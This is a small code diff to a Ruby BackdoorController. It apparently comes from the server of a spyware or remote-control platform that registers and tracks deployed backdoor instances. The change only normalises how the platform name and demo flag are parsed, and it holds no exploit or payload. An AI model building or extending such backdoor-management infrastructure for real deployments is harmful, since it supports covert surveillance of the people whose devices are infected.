@@ -46,9 +46,10 @@ class BackdoorController < RESTController
 
     # parse the platform to check if the backdoor is in demo mode ( -DEMO appended )
     demo = true unless request['subtype']['-DEMO'].nil?
+    platform = request['subtype'].gsub(/-DEMO/, '').downcase
 
     # is the backdoor already in the database? (has it synchronized at least one time?)
-    backdoor = Item.where({_kind: 'backdoor', build: request['build_id'], instance: request['instance_id'], platform: request['subtype'].downcase, demo: demo}).first
+    backdoor = Item.where({_kind: 'backdoor', build: request['build_id'], instance: request['instance_id'], platform: platform, demo: demo}).first
 
     # yes it is, return the status
     unless backdoor.nil?
@@ -81,7 +82,7 @@ class BackdoorController < RESTController
     backdoor = factory.clone_instance
 
     # specialize it with the platform and the unique instance
-    backdoor.platform = request['subtype'].downcase.gsub(/-DEMO/, '')
+    backdoor.platform = platform
     backdoor.instance = request['instance_id']
     backdoor.demo = demo
 
